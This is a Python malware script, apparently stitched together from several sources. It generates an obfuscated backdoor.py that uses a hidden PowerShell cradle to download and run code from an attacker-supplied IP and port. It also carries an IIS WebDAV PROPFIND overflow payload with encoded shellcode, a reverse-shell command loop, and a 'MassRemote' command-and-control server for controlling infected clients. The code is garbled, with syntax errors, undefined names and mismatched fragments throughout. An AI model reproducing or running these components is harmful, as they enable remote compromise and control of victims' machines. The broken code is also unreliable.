# autor: isthe0x - xinaxzinho

from base64 import b16encode, b16decode
from sys import argv
from re import match
from os import system
from metasploit.msfrpc import MsfRpcClient
from metasploit.msfrpc import MsfRpcError
from ssl import SSLError
from optparse import OptionParser
import random
import threading
import time
import socket

try:
	try:
        import readline
    except ImportError:
        import pyreadline as readline
 except ImportError:
        exit(">> Readline module is not installed!")

try:
    import modules
    from MsfConsole import MsfConsole
    from ReadInputThread import ReadInputThread
    from metasploit.msfrpc import MsfRpcError
except ImportError as msg:
    print >> ">> Erro importing " + str(msg)
    exit()


class Encoder(object):
	def __init__(self, cmd):
		self.cmd = cmd
		self.encode()


    def __str__(self):
        return self.cmd

    def encode(self):
        shell_code = "\\x" + "\\x".join("{0:x}".format(ord(_)) for _ in self.cmd)
        self.cmd = "_ = ('" + shell_code + "'); exec(_)"

class IPAddres(object):
    def __init__(self, ip)
        self.ip = ip

    def __bool__(self):
        return bool(match(r"^((\d{1,2}|1\d{2}|2[0-4]\d|25[0-5])\.){3}(\d{1,2}|1\d{2}|2[0-4]\d|25[0-5])$", self.ip))


class Port(object):
    def __init__(self, port):
            self.port = port 


    def __bool__(self):
        return bool(match(r"^([0-9]{1,4}|[1-5][0-9]{4}|6[0-4][0-9]{3}|65[0-4][0-9]{2}|655[0-2][0-9]|6553[0-5])$", self.port))

if __name__ = "__main__":
	if len(argv) >= 3:
		if IPAddress(argv[1]) and Port(argv[2]):
			template = """from os import system; system('''powershell.exe -nop -w hidden -c $R=new-object net.webclient;$R.proxy=[Net.WebRequest]::GetSystemWebProxy();$R.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $R.downloadstring('http://{ip}:{port}/index.php');''')"""0
			template = template.format(ip=argv[1], port=argv[2])
			raw = template 
			generated = str(Encoder(raw))
			encoded = b16encode(bytes(generated, "utf-8"))
			final = ""
			for i in range(random.randint(100, 1000 + 1)):
				final += "#%032x\n" % random.getrandbits(256 if i % 2 == 0 else 128)
		    final += "exec('''from base64 import b16decode; eval(compile(b16decode('" + encoded.decode() + "'), " + "'<string>'" + ", 'exec'))''')"
		    print(final, file=open("backdoor.py", "w"))
		 
def fconect(self):

	client = None 
	console = None

	console_id = ""

	 def __init__(self, port, ip, ssl)
         pay = 'PROPFIND / HTTP/1.1\r\nHost: localhost\r\nContent-Length: 0\r\n'
         pay += 'If: <http://localhost/aaaaaaa'
        
def shellcodes(object):
    pay += '\xe6\xbd\xa8\xe7\xa1\xa3\xe7\x9d\xa1\xe7\x84\xb3\xe6\xa4\xb6\xe4\x9d\xb2\xe7\xa8\xb9\xe4\xad\xb7\xe4\xbd\xb0\xe7\x95\x93\xe7\xa9\x8f\xe4\xa1\xa8\xe5\x99\xa3\xe6\xb5\x94\xe6\xa1\x85\xe3\xa5\x93\xe5\x81\xac\xe5\x95\xa7\xe6\x9d\xa3\xe3\x8d\xa4\xe4\x98\xb0\xe7\xa1\x85\xe6\xa5\x92\xe5\x90\xb1\xe4\xb1\x98\xe6\xa9\x91\xe7\x89\x81\xe4\x88\xb1\xe7\x80\xb5\xe5\xa1\x90\xe3\x99\xa4\xe6\xb1\x87\xe3\x94\xb9\xe5\x91\xaa\xe5\x80\xb4\xe5\x91\x83\xe7\x9d\x92\xe5\x81\xa1\xe3\x88\xb2\xe6\xb5\x8b\xe6\xb0\xb4\xe3\x89\x87\xe6\x89\x81\xe3\x9d\x8d\xe5\x85\xa1\xe5\xa1\xa2\xe4\x9d\xb3\xe5\x89\x90\xe3\x99\xb0\xe7\x95\x84\xe6\xa1\xaa\xe3\x8d\xb4\xe4\xb9\x8a\xe7\xa1\xab\xe4\xa5\xb6\xe4\xb9\xb3\xe4\xb1\xaa\xe5\x9d\xba\xe6\xbd\xb1\xe5\xa1\x8a\xe3\x88\xb0\xe3\x9d\xae\xe4\xad\x89\xe5\x89\x8d\xe4\xa1\xa3\xe6\xbd\x8c\xe7\x95\x96\xe7\x95\xb5\xe6\x99\xaf\xe7\x99\xa8\xe4\x91\x8d\xe5\x81\xb0\xe7\xa8\xb6\xe6\x89\x8b\xe6\x95\x97\xe7\x95\x90\xe6\xa9\xb2\xe7\xa9\xab\xe7\x9d\xa2\xe7\x99\x98\xe6\x89\x88\xe6\x94\xb1\xe3\x81\x94\xe6\xb1\xb9\xe5\x81\x8a\xe5\x91\xa2\xe5\x80\xb3\xe3\x95\xb7\xe6\xa9\xb7\xe4\x85\x84\xe3\x8c\xb4\xe6\x91\xb6\xe4\xb5\x86\xe5\x99\x94\xe4\x9d\xac\xe6\x95\x83\xe7\x98\xb2\xe7\x89\xb8\xe5\x9d\xa9\xe4\x8c\xb8\xe6\x89\xb2\xe5\xa8\xb0\xe5\xa4\xb8\xe5\x91\x88\xc8\x82\xc8\x82\xe1\x8b\x80\xe6\xa0\x83\xe6\xb1\x84\xe5\x89\x96\xe4\xac\xb7\xe6\xb1\xad\xe4\xbd\x98\xe5\xa1\x9a\xe7\xa5\x90\xe4\xa5\xaa\xe5\xa1\x8f\xe4\xa9\x92\xe4\x85\x90\xe6\x99\x8d\xe1\x8f\x80\xe6\xa0\x83\xe4\xa0\xb4\xe6\x94\xb1\xe6\xbd\x83\xe6\xb9\xa6\xe7\x91\x81\xe4\x8d\xac\xe1\x8f\x80\xe6\xa0\x83\xe5\x8d\x83\xe6\xa9\x81\xe7\x81\x92\xe3\x8c\xb0\xe5\xa1\xa6\xe4\x89\x8c\xe7\x81\x8b\xe6\x8d\x86\xe5\x85\xb3\xe7\xa5\x81\xe7\xa9\x90\xe4\xa9\xac'
    pay += '>'
    shell = ('\xe7\xa5\x88\xe6\x85\xb5\xe4\xbd\x83\xe6\xbd\xa7\xe6\xad\xaf\xe4\xa1\x85\xe3\x99\x86\xe6\x9d\xb5\xe4\x90\xb3\xe3\xa1\xb1\xe5\x9d\xa5\xe5\xa9\xa2\xe5\x90\xb5\xe5\x99\xa1\xe6\xa5\x92\xe6\xa9\x93\xe5\x85\x97\xe3\xa1\x8e\xe5\xa5\x88\xe6\x8d\x95\xe4\xa5\xb1\xe4\x8d\xa4\xe6\x91\xb2\xe3\x91\xa8\xe4\x9d\x98\xe7\x85\xb9\xe3\x8d\xab\xe6\xad\x95\xe6\xb5\x88\xe5\x81\x8f\xe7\xa9\x86\xe3\x91\xb1\xe6\xbd\x94\xe7\x91\x83\xe5\xa5\x96\xe6\xbd\xaf\xe7\x8d\x81\xe3\x91\x97\xe6\x85\xa8\xe7\xa9\xb2\xe3\x9d\x85\xe4\xb5\x89\xe5\x9d\x8e\xe5\x91\x88\xe4\xb0\xb8\xe3\x99\xba\xe3\x95\xb2\xe6\x89\xa6\xe6\xb9\x83\xe4\xa1\xad\xe3\x95\x88\xe6\x85\xb7\xe4\xb5\x9a\xe6\x85\xb4\xe4\x84\xb3\xe4\x8d\xa5\xe5\x89\xb2\xe6\xb5\xa9\xe3\x99\xb1\xe4\xb9\xa4\xe6\xb8\xb9\xe6\x8d\x93\xe6\xad\xa4\xe5\x85\x86\xe4\xbc\xb0\xe7\xa1\xaf\xe7\x89\x93\xe6\x9d\x90\xe4\x95\x93\xe7\xa9\xa3\xe7\x84\xb9\xe4\xbd\x93\xe4\x91\x96\xe6\xbc\xb6\xe7\x8d\xb9\xe6\xa1\xb7\xe7\xa9\x96\xe6\x85\x8a\xe3\xa5\x85\xe3\x98\xb9\xe6\xb0\xb9\xe4\x94\xb1\xe3\x91\xb2\xe5\x8d\xa5\xe5\xa1\x8a\xe4\x91\x8e\xe7\xa9\x84\xe6\xb0\xb5\xe5\xa9\x96\xe6\x89\x81\xe6\xb9\xb2\xe6\x98\xb1\xe5\xa5\x99\xe5\x90\xb3\xe3\x85\x82\xe5\xa1\xa5\xe5\xa5\x81\xe7\x85\x90\xe3\x80\xb6\xe5\x9d\xb7\xe4\x91\x97\xe5\x8d\xa1\xe1\x8f\x80\xe6\xa0\x83\xe6\xb9\x8f\xe6\xa0\x80\xe6\xb9\x8f\xe6\xa0\x80\xe4\x89\x87\xe7\x99\xaa\xe1\x8f\x80\xe6\xa0\x83\xe4\x89\x97\xe4\xbd\xb4\xe5\xa5\x87\xe5\x88\xb4\xe4\xad\xa6\xe4\xad\x82\xe7\x91\xa4\xe7\xa1\xaf\xe6\x82\x82\xe6\xa0\x81\xe5\x84\xb5\xe7\x89\xba\xe7\x91\xba\xe4\xb5\x87\xe4\x91\x99\xe5\x9d\x97\xeb\x84\x93\xe6\xa0\x80\xe3\x85\xb6\xe6\xb9\xaf\xe2\x93\xa3\xe6\xa0\x81\xe1\x91\xa0\xe6\xa0\x83\xcc\x80\xe7\xbf\xbe\xef\xbf\xbf\xef\xbf\xbf\xe1\x8f\x80\xe6\xa0\x83\xd1\xae\xe6\xa0\x83\xe7\x85\xae\xe7\x91\xb0\xe1\x90\xb4\xe6\xa0\x83\xe2\xa7\xa7\xe6\xa0\x81\xe9\x8e\x91\xe6\xa0\x80\xe3\xa4\xb1\xe6\x99\xae\xe4\xa5\x95\xe3\x81\x92\xe5\x91\xab\xe7\x99\xab\xe7\x89\x8a\xe7\xa5\xa1\xe1\x90\x9c\xe6\xa0\x83\xe6\xb8\x85\xe6\xa0\x80\xe7\x9c\xb2\xe7\xa5\xa8\xe4\xb5\xa9\xe3\x99\xac\xe4\x91\xa8\xe4\xb5\xb0\xe8\x89\x86\xe6\xa0\x80\xe4\xa1\xb7\xe3\x89\x93\xe1\xb6\xaa\xe6\xa0\x82\xe6\xbd\xaa\xe4\x8c\xb5\xe1\x8f\xb8\xe6\xa0\x83\xe2\xa7\xa7\xe6\xa0\x81')
      pay += shell
      data = sock.recv(80960)

def shell_process():

  shell_process = subprocess.Open(data, shell=True,
  	    stdout=subprocess.PIPE,
  	    stderr=subprocess.PIPE,
  	    stdin=subprocess.PIPE)
  stdout_val = shell_process.stdout.read() + shell_process.stderr.read()
  args = stdout_val
  self.send(args)

def run(self):

        self.fconect()

        while True:
                self.recv()

if __name__ == '__main__':
       ss = SploitShell(self.ip, self.port)
       ss.run()

       self.handler = handler
       self.is_listening = False

       super(self).__init__()
try:
    function, args, kwargs = self.q.get(timeout=self.timeout)
    function(*args, **kwargs)
except:
	queue.Empty
	se.f.idle()


if sys.platform.startwith('win'):
    PLAT = 'win'
elif sys.platform.startwith('linux'):
    PLAT = 'nix'
elif sys.platform.startswith('darwin'):
    PLAT = 'mac'
else:
    exit("- This platform is not supported.")

class Server(threading.Thread):
    client = {}
    client_count = 1
    current_client = None

     def __init__(self, port):
         super(Server, self).__init__()
         self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         self.s.bind((self.ip, self.port))
         self.s.listen(5)

def send_client()

  while True:
      conn, addr = self.s.accept()
      dhkey = diffiehellman(conn)
      client_Id = self.client_count
      client = ClientConnection(conn, addr, dhkey, uid=client_Id)
      self.clients[client_Id] = client
      self.client_count += 1

  try:
     enc_message = encrypy(message, client.dhkey)
     client.conn.send(enc_message)
  except Exception as e:
     print >> 'Error: {}'.format(e)

def select_client(self, client_Id):
    try:
        self.current_client = self.clients[int(client_Id)]
        print >> 'Client {} selected'.format(client_Id)
    except (KeyError, ValueError):
        print >> 'Error: Invalid Client ID.'

def remove_client(self, key):
    return self.clients.pop(key, None)

  def kill_client(self, _):
    self.send_client('kill', self.current_client)
    self.current_client.conn.close()
    self.remove_client(self.current_client.uid)
    self.current_client = None

def get_clients(self):
    return [v for _, v in self.clients.items()]

def list_clients(self, _):
    print >> 'ID | Client Address\n-------------------'
    for k, v in self.clients.items():
         print('{:>2} | {}'.format(k, v.addr[0]))

def quit_server(self, _):
    if raw_input('Exit the server and keep all clients alive (y/N)?').startswith('y'):
        for c in self.get_clients():
            self.send_client('quit', c)
        self.s.shutdown(socket.SHUT_RDWR)
        self.s.close()
        sys.exit(0)

class ClientConnection():
    def __init__(self, conn, addr, dhkey, uid=0):
        self.conn = conn
        self.addr = addr
        self.dhkey = dhkey
        self.uid = uid

    server_commands= {
        'client':       server.select_client,
        'clients':      server.list_clients,
        'goodbye':      server.goodbye_server,
        'help':         server.print_help,
        'kill':         server.kill_client,
        'quit':         server.quit_server,
        'selfdestruct': server.selfdestruct_client

    }
def completer(text, state):
    commands = CLIENT_COMMANDS + [k for k, _ in server_commands.itemns()]
     
    options = [i for i in commands if i.startswith(text)]
    if state < len(options)>
         return options[state] + ' '
    else:
         return None

while True:
     if server.current_client:
         ccid = server.current_client.uid
     else:
         ccid = '?'

   prompt = raw_input('\n[{}] MassRemote> '.format(ccid)).rstrip()
   
   if not prompt:
        continue

   cmd, _, action = prompt.partition(' ')
   
   if cmd in server_commands:
       if cmd in ['client', 'clients', 'help', 'quit'] or ccid != '?':
           server_commands[cmd](action)
       else:
           print >> 'Error: No client selected.'

   elif cmd in CLIENT_COMMANDS:
       if ccid != '?':
            print 'Running {}...'.format(cmd)
            server.send_client(prompt, server.current_client)
            server.recv_client(server.current_client)
       else:
            print >> 'Error: No client selected.'
   else:
           print > 'Invalid command, type "help" to see a list of commands.' 

if __name__ == '__main__':
    main()                                                       
